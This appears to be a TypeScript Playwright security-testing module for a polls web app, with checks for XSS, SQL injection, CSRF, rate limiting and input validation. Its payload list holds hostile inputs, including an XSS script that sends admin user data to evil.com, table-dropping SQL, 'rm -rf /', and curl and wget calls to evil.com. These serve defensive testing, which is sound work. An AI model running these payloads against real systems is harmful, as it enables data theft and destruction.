/**
 * Security Tester - Advanced Security Testing
 * 
 * This module provides comprehensive security testing and validation
 * for the Testing Roadmap to Perfection.
 * 
 * Created: January 27, 2025
 * Updated: January 27, 2025
 */

import type { Page } from '@playwright/test';

export interface SecurityTestResult {
  testName: string;
  passed: boolean;
  vulnerabilities: string[];
  recommendations: string[];
  details: any;
}

export interface SecurityPayloads {
  xss: string[];
  sqlInjection: string[];
  csrf: string[];
  pathTraversal: string[];
  commandInjection: string[];
}

export class SecurityTester {
  private static instance: SecurityTester;
  private results: SecurityTestResult[] = [];

  private constructor() {}

  static getInstance(): SecurityTester {
    if (!SecurityTester.instance) {
      SecurityTester.instance = new SecurityTester();
    }
    return SecurityTester.instance;
  }

  /**
   * Get security test payloads
   */
  getSecurityPayloads(): SecurityPayloads {
    return {
      xss: [
        '<script>alert("XSS")</script>',
        '<img src="x" onerror="alert(\'XSS\')">',
        '<svg onload="alert(\'XSS\')">',
        'javascript:alert("XSS")',
        '<iframe src="javascript:alert(\'XSS\')">',
        '<script>document.location="http://evil.com"</script>',
        '<script>fetch("/api/admin/users").then(r=>r.text()).then(d=>fetch("http://evil.com/steal?data="+d))</script>',
      ],
      sqlInjection: [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "' UNION SELECT * FROM users --",
        "'; DELETE FROM polls; --",
        "' OR 1=1 --",
        "admin'--",
        "' OR 'x'='x",
        "'; INSERT INTO users (email) VALUES ('hacker@evil.com'); --",
      ],
      csrf: [
        '<form action="/api/polls" method="POST"><input name="title" value="CSRF Attack"><input type="submit" value="Submit"></form>',
        '<img src="/api/polls?title=CSRF&description=Attack">',
        '<script>fetch("/api/polls", {method: "POST", body: "title=CSRF&description=Attack"})</script>',
      ],
      pathTraversal: [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
        '....//....//....//etc/passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '..%252f..%252f..%252fetc%252fpasswd',
      ],
      commandInjection: [
        '; ls -la',
        '| cat /etc/passwd',
        '&& whoami',
        '; rm -rf /',
        '| curl http://evil.com/steal',
        '; wget http://evil.com/malware',
      ],
    };
  }

  /**
   * Test XSS Prevention
   */
  async testXSSPrevention(page: Page, inputSelector: string, payloads: string[]): Promise<SecurityTestResult> {
    const result: SecurityTestResult = {
      testName: 'XSS Prevention',
      passed: true,
      vulnerabilities: [],
      recommendations: [],
      details: {},
    };

    for (const payload of payloads) {
      try {
        // Clear input and enter payload
        await page.fill(inputSelector, '');
        await page.fill(inputSelector, payload);
        
        // Check if script executed (look for alert or script tags in DOM)
        const hasScript = await page.evaluate(() => {
          return document.querySelector('script') !== null;
        });
        
        const hasAlert = await page.evaluate(() => {
          return document.body.innerHTML.includes('alert(');
        });
        
        const hasXSS = await page.evaluate(() => {
          return document.body.innerHTML.includes('<script>') || 
                 document.body.innerHTML.includes('javascript:') ||
                 document.body.innerHTML.includes('onerror=');
        });

        if (hasScript || hasAlert || hasXSS) {
          result.passed = false;
          result.vulnerabilities.push(`XSS vulnerability detected with payload: ${payload}`);
        }

        // Check if payload was properly escaped in DOM
        const escapedPayload = await page.evaluate((sel) => {
          const element = document.querySelector(sel);
          return element ? element.innerHTML : '';
        }, inputSelector);

        if (escapedPayload.includes('<script>') || escapedPayload.includes('javascript:')) {
          result.passed = false;
          result.vulnerabilities.push(`XSS payload not properly escaped: ${payload}`);
        }

      } catch (error) {
        result.vulnerabilities.push(`XSS test failed with payload ${payload}: ${error instanceof Error ? error.message : String(error)}`);
      }
    }

    if (!result.passed) {
      result.recommendations.push('Implement proper input sanitization');
      result.recommendations.push('Use Content Security Policy (CSP)');
      result.recommendations.push('Escape HTML entities in user input');
      result.recommendations.push('Validate and sanitize all user inputs');
    }

    this.results.push(result);
    return result;
  }

  /**
   * Test SQL Injection Prevention
   */
  async testSQLInjectionPrevention(page: Page, inputSelector: string, payloads: string[]): Promise<SecurityTestResult> {
    const result: SecurityTestResult = {
      testName: 'SQL Injection Prevention',
      passed: true,
      vulnerabilities: [],
      recommendations: [],
      details: {},
    };

    for (const payload of payloads) {
      try {
        // Clear input and enter payload
        await page.fill(inputSelector, '');
        await page.fill(inputSelector, payload);
        
        // Submit form or trigger action
        const submitButton = page.locator('[data-testid="create-poll-btn"], button[type="submit"]').first();
        if (await submitButton.isVisible()) {
          await submitButton.click();
          await page.waitForLoadState('networkidle');
        }

        // Check for SQL error messages
        const hasSQLError = await page.evaluate(() => {
          const bodyText = document.body.textContent || '';
          return bodyText.includes('SQL') || 
                 bodyText.includes('database') ||
                 bodyText.includes('syntax error') ||
                 bodyText.includes('mysql') ||
                 bodyText.includes('postgresql');
        });

        if (hasSQLError) {
          result.passed = false;
          result.vulnerabilities.push(`SQL injection vulnerability detected with payload: ${payload}`);
        }

        // Check for unexpected data exposure
        const hasDataExposure = await page.evaluate(() => {
          const bodyText = document.body.textContent || '';
          return bodyText.includes('admin') && 
                 bodyText.includes('password') ||
                 bodyText.includes('email') &&
                 bodyText.includes('@');
        });

        if (hasDataExposure) {
          result.passed = false;
          result.vulnerabilities.push(`Data exposure detected with payload: ${payload}`);
        }

      } catch (error) {
        result.vulnerabilities.push(`SQL injection test failed with payload ${payload}: ${error instanceof Error ? error.message : String(error)}`);
      }
    }

    if (!result.passed) {
      result.recommendations.push('Use parameterized queries');
      result.recommendations.push('Implement input validation');
      result.recommendations.push('Use ORM with built-in SQL injection protection');
      result.recommendations.push('Implement database access controls');
    }

    this.results.push(result);
    return result;
  }

  /**
   * Test CSRF Protection
   */
  async testCSRFProtection(page: Page): Promise<SecurityTestResult> {
    const result: SecurityTestResult = {
      testName: 'CSRF Protection',
      passed: true,
      vulnerabilities: [],
      recommendations: [],
      details: {},
    };

    try {
      // Check for CSRF token in forms
      const hasCSRFToken = await page.evaluate(() => {
        const forms = document.querySelectorAll('form');
        for (const form of forms) {
          const token = form.querySelector('input[name*="csrf"], input[name*="token"]');
          if (token) return true;
        }
        return false;
      });

      if (!hasCSRFToken) {
        result.passed = false;
        result.vulnerabilities.push('No CSRF token found in forms');
      }

      // Check for SameSite cookie attributes
      const cookies = await page.context().cookies();
      const hasSameSite = cookies.some(cookie => 
        cookie.sameSite === 'Strict' || cookie.sameSite === 'Lax'
      );

      if (!hasSameSite) {
        result.passed = false;
        result.vulnerabilities.push('No SameSite cookie attributes found');
      }

      // Check for CSRF protection headers
      const response = await page.goto('/');
      const headers = response?.headers();
      const hasCSRFHeader = headers?.['x-csrf-token'] || headers?.['x-requested-with'];

      if (!hasCSRFHeader) {
        result.passed = false;
        result.vulnerabilities.push('No CSRF protection headers found');
      }

    } catch (error) {
      result.vulnerabilities.push(`CSRF test failed: ${error instanceof Error ? error.message : String(error)}`);
    }

    if (!result.passed) {
      result.recommendations.push('Implement CSRF tokens in all forms');
      result.recommendations.push('Use SameSite cookie attributes');
      result.recommendations.push('Implement CSRF protection middleware');
      result.recommendations.push('Validate Origin and Referer headers');
    }

    this.results.push(result);
    return result;
  }

  /**
   * Test Rate Limiting
   */
  async testRateLimiting(page: Page, endpoint: string, maxRequests = 10): Promise<SecurityTestResult> {
    const result: SecurityTestResult = {
      testName: 'Rate Limiting',
      passed: true,
      vulnerabilities: [],
      recommendations: [],
      details: {},
    };

    try {
      let blockedRequests = 0;
      const requests = [];

      // Make multiple requests rapidly
      for (let i = 0; i < maxRequests; i++) {
        const requestPromise = page.goto(endpoint).catch(() => null);
        requests.push(requestPromise);
      }

      // Wait for all requests to complete
      const responses = await Promise.all(requests);

      // Check for rate limiting responses
      for (const response of responses) {
        if (response && (response.status() === 429 || response.status() === 403)) {
          blockedRequests++;
        }
      }

      if (blockedRequests === 0) {
        result.passed = false;
        result.vulnerabilities.push('No rate limiting detected');
      } else {
        result.details.blockedRequests = blockedRequests;
        result.details.totalRequests = maxRequests;
      }

    } catch (error) {
        result.vulnerabilities.push(`Rate limiting test failed: ${error instanceof Error ? error.message : String(error)}`);
    }

    if (!result.passed) {
      result.recommendations.push('Implement rate limiting middleware');
      result.recommendations.push('Use Redis for rate limiting storage');
      result.recommendations.push('Implement IP-based rate limiting');
      result.recommendations.push('Add rate limiting headers');
    }

    this.results.push(result);
    return result;
  }

  /**
   * Test Input Validation
   */
  async testInputValidation(page: Page, inputSelector: string, invalidInputs: string[]): Promise<SecurityTestResult> {
    const result: SecurityTestResult = {
      testName: 'Input Validation',
      passed: true,
      vulnerabilities: [],
      recommendations: [],
      details: {},
    };

    for (const invalidInput of invalidInputs) {
      try {
        await page.fill(inputSelector, invalidInput);
        
        // Try to submit form
        const submitButton = page.locator('[data-testid="create-poll-btn"], button[type="submit"]').first();
        if (await submitButton.isVisible()) {
          await submitButton.click();
          await page.waitForTimeout(1000);
        }

        // Check for validation errors
        const hasValidationError = await page.evaluate(() => {
          const errorElements = document.querySelectorAll('[class*="error"], [class*="invalid"]');
          return errorElements.length > 0;
        });

        if (!hasValidationError) {
          result.passed = false;
          result.vulnerabilities.push(`No validation error for invalid input: ${invalidInput}`);
        }

      } catch (error) {
        result.vulnerabilities.push(`Input validation test failed with input ${invalidInput}: ${error instanceof Error ? error.message : String(error)}`);
      }
    }

    if (!result.passed) {
      result.recommendations.push('Implement client-side validation');
      result.recommendations.push('Implement server-side validation');
      result.recommendations.push('Use validation libraries');
      result.recommendations.push('Provide clear error messages');
    }

    this.results.push(result);
    return result;
  }

  /**
   * Generate Security Report
   */
  generateSecurityReport(): {
    summary: {
      totalTests: number;
      passedTests: number;
      failedTests: number;
      totalVulnerabilities: number;
      totalRecommendations: number;
    };
    details: SecurityTestResult[];
  } {
    const totalTests = this.results.length;
    const passedTests = this.results.filter(r => r.passed).length;
    const failedTests = this.results.filter(r => !r.passed).length;
    const totalVulnerabilities = this.results.reduce((sum, r) => sum + r.vulnerabilities.length, 0);
    const totalRecommendations = this.results.reduce((sum, r) => sum + r.recommendations.length, 0);

    return {
      summary: {
        totalTests,
        passedTests,
        failedTests,
        totalVulnerabilities,
        totalRecommendations,
      },
      details: this.results,
    };
  }

  /**
   * Reset Security Tester
   */
  reset(): void {
    this.results = [];
  }
}

// Export singleton instance
export const securityTester = SecurityTester.getInstance();
